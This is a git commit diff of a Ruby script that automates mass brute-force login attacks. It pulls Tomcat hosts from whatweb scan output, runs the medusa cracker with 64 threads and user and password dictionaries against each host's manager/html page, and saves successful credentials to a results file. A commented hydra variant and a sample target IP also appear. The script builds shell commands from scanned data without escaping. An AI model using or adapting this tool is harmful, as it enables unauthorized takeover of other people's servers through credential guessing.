dd5368c593e2643eaaf5f9d8c3647b3737f8341a
root <root@li93-156.members.linode.com>
2015-06-16 14:38:03 +0000

    medusa

--- bin/medusa.rb
+++ bin/medusa.rb
@@ -1,30 +1,35 @@
 #!/usr/bin/env ruby
 
 #medusa -M http -h 10.99.184.116 -n 8888 -U ../../develop/masport/db/dict/user.txt -P ../../develop/masport/db/dict/pass.txt
+#hydra -t 64 -V -L ../db/dict/user.txt -P ../db/dict/pass.txt -M ../db/hydra/url.txt http-get
 input = '../db/medusa/url.txt'
 filter= ' | grep -v 1999 | grep -v https'
-cmd = "grep '\"http_status\":401' ../db/whatweb/* | awk -F '\"' '{print $4}' #{filter} > #{input}"
+#cmd = "grep '\"http_status\":401' ../db/whatweb/* | awk -F '\"' '{print $4}' #{filter} > #{input}"
+cmd = "grep 'tomcat' ../db/whatweb/* | awk -F '\"' '{print $4}' #{filter} > #{input}"
 puts 'Running syscmd: '+cmd
 result = `#{cmd}`
 
 File.open(input).each do |line|
+  result = ''
+  arg_path = '-m DIR:manager/html/'
   line.chomp!
   line.gsub!('http://','')
   ary = line.split ':'
   ip   = ary[0]
   port = ary[1]
   if ip and port
-    puts line
-    cmd="medusa -M http -h #{ip} -n #{port} -U ../db/dict/user.txt -P ../db/dict/pass.txt"
+    #puts line
+    cmd="medusa -t 64 -w 1 -v 4 -M http -h #{ip} -n #{port} -U ../db/dict/user.txt -P ../db/dict/pass.txt #{arg_path}"
     puts 'Running syscmd: '+cmd
     result = `#{cmd}`
+    if result and result.include? '[SUCCESS]'
+      File.open('../db/medusa/result.txt', 'a') { |file| 
+        file.write(cmd)
+        file.write(result) 
+      }
+    end
     puts result
   end
 
-  #if result and result.include? 'successfully'
-  #  cmd="echo #{result} >> ../db/hydra/result.txt"
-  #  puts 'Running syscmd: '+cmd
-  #  `#{cmd}`
-  #end
 end
 
